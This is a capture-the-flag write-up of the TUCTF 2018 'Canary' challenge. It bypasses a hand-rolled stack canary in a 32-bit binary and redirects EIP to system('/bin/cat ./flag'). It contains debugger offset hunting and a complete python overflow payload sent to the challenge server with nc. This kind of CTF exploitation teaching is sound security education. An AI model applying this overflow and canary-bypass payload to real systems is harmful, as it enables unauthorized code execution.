#### TUCTF CTF 2018 - Canary 471 - Pwn 

##### Challenge

Difficulty: easy
I can fix overflows easy! I'll just make my own stack canary no problem.
Just try and pwn this, I dare you

nc 18.222.227.1 12345


#### Summary

It is a pwn task where we have to bypass a custom "stack smashing protection".  Thus, our goal is bypass this canary and generate the payload using the system function and /bin/cat which can be found in the program.

#### Solution

```bash
canary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9b48c0ff2f3207562359b54cb199bae1583f918c, not stripped
```

If we open the binary with radare2 we can see that all operations about the "custom canary" are in the function doCanary, also, there is the buffer overflow too.

![](https://unam.re/static/files/Canary-main.png)

The program is compiled with NX, so inject a shellcode into stack is not possible (well, it is possible but it will not execute).

```bash
[0x080486e3]> iI
arch     x86
binsz    6586
bintype  elf
bits     32
canary   false
class    ELF32
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```



In the function doCanary is the buffer overflow and the function which check if the canary has been overwritten. So, our purpose is overwrite the canary with a value that we know in order to bypass the "canary check"

![](https://unam.re/static/files/Canary-doCanary.png)





![](https://unam.re/static/files/Canary-checkCanary.png)



Now that we understand how the canary is checked, we can find all offsets using gdb+peda.

Our first step, is bypass (mov    eax,DWORD PTR [eax*4+0x804a0a0]) which should have a correct address.

```assembly
EAX: 0x41414641 ('AFAA')
EBX: 0x0 
ECX: 0xbffff324 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EDX: 0x1a4 
ESI: 0xb7faa000 --> 0x1d5d8c 
EDI: 0x0 
EBP: 0xbffff30c --> 0xbffff318 --> 0xbffff358 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
ESP: 0xbffff304 --> 0xb7faa000 --> 0x1d5d8c 
EIP: 0x8048677 (<checkCanary+21>:	mov    eax,DWORD PTR [eax*4+0x804a0a0])
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804866e <checkCanary+12>:	mov    DWORD PTR [ebp-0x4],eax
   0x8048671 <checkCanary+15>:	mov    eax,DWORD PTR [ebp+0x8]
   0x8048674 <checkCanary+18>:	mov    eax,DWORD PTR [eax+0x2c]
=> 0x8048677 <checkCanary+21>:	mov    eax,DWORD PTR [eax*4+0x804a0a0]

```

It is in offset 44.

```
EAX+0 found at offset: 44
```

We know that the canary is in 0x804a0a0, so we examine what is in 0x804a0a0+0x4 and it is 0x0.

```assembly
gdb-peda$ x/gw 0x804a0a0
0x804a0a0 <cans>:	0xe2db4407
gdb-peda$ x/gw 0x804a0a0+0x4
0x804a0a4 <cans+4>:	0x00000000
```

Thus, we can overwrite the canary with 0x0, and it will work! (the canary is at offset 40)

Finally we have bypassed the canary, and we can go to the last *ret* in order to handle the EIP 

```assembly
gdb-peda$ pattern create 100 
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ shell python -c 'print "A"*40+"\x00\x00\x00\x00"+"\x01\x00\x00\x00"+"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"' > input
gdb-peda$ r < input 
Starting program: /root/Downloads/canary < input
*slides open window*
Password? Yeah right! Scram

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xb7faadc7 --> 0xfab8900a 
EDX: 0xb7fab890 --> 0x0 
ESI: 0xb7faa000 --> 0x1d5d8c 
EDI: 0x0 
EBP: 0x41734141 ('AAsA')
ESP: 0xbffff360 ("$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\no\376\267")
EIP: 0x41414241 ('ABAA')
EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414241
[------------------------------------stack-------------------------------------]
0000| 0xbffff360 ("$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\no\376\267")
0004| 0xbffff364 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\no\376\267")
0008| 0xbffff368 ("A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\no\376\267")
0012| 0xbffff36c ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\no\376\267")
0016| 0xbffff370 ("AA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\no\376\267")
0020| 0xbffff374 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\no\376\267")
0024| 0xbffff378 ("EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\no\376\267")
0028| 0xbffff37c ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\no\376\267")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414241 in ?? ()
gdb-peda$ patts
Registers contain pattern buffer:
EBP+0 found at offset: 4
EIP+0 found at offset: 8
Registers point to pattern buffer:
[ESP] --> offset 12 - size ~99
Pattern buffer found at:
0xbffff358 : offset    4 - size   96 ($sp + -0x8 [-2 dwords])
References to pattern buffer found at:
0xbffff314 : 0xbffff358 ($sp + -0x4c [-19 dwords])

```

So, we know that EIP can be overwrite at offset 8 in this *De Bruijn sequence*. 

```
"A"*40+CANARY+0x1+"A"*8+EIP
```

Now we have the control of EIP, then search for system and /bin/cat flag in order to get the flag.

```assembly
[0x08048510]> afll~system
0x080484a0    6     1     0     1    3 0x080484a0     6 0x080484a6     0    0      0    1     0 sym.imp.system
[0x08048510]> iz~flag
002 0x000008a9 0x080488a9  15  16 (.rodata) ascii /bin/cat ./flag
```



Finally, we have all ingredients to make the functional exploit which will print the flag.

```python
$ python -c 'print "A"*40+"\x00\x00\x00\x00"+"\x01\x00\x00\x00"+"CCCCBBBB"+"\xa0\x84\x04\x08"+"AAAA"+"\xa9\x88\x04\x08"' > input
# It works on local
$ cat input | ./canary 
*slides open window*
Password? Yeah right! Scram
flag{test-flag-here}
Segmentation fault
```



and finally, we launch against the server:

```bash
hiro@HackingLab:~/CTF/TUCTF_2018/pwn_canary$ python -c 'print "A"*40+"\x00\x00\x00\x00"+"\x01\x00\x00\x00"+"CCCCBBBB"+"\xa0\x84\x04\x08"+"AAAA"+"\xa9\x88\x04\x08"' > input
hiro@HackingLab:~/CTF/TUCTF_2018/pwn_canary$ cat input | nc 18.222.227.1 12345
*slides open window*
Password? Yeah right! Scram
TUCTF{n3v3r_r0ll_y0ur_0wn_c4n4ry}
```



Happy hacking! :)